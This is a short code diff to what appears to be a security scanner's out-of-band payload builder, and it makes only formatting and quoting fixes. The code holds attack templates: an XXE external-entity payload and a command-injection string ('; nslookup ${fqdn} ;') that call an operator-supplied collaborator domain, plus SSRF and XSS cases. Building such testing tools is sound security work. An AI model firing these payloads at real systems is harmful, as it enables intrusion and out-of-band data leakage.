@@ -57,8 +57,9 @@ export function buildOobPayload(opts: {
   readonly channel?: OobChannel;
 }): OobPayload {
   if (!opts.collaboratorDomain) throw new Error('collaboratorDomain is required (operator-supplied)');
-  if (!opts.collaboratorDomain.includes('.'))
+  if (!opts.collaboratorDomain.includes('.')) {
     throw new Error(`collaboratorDomain must be a FQDN: ${opts.collaboratorDomain}`);
+  }
   const channel: OobChannel = opts.channel ?? 'dns';
   const random = randomBytes(6).toString('hex');
   if (!SUBDOMAIN_PREFIX_RE.test(random)) throw new Error('subdomain generator misbehaved');
@@ -110,7 +111,7 @@ function renderInjection(vulnClass: OobPayload['vulnClass'], channel: OobChannel
     case 'ssrf':
       return url;
     case 'xxe':
-      return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"${url}\">]><foo>&xxe;</foo>`;
+      return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${url}">]><foo>&xxe;</foo>`;
     case 'rce':
       return `; nslookup ${fqdn} ;`;
     case 'xss':
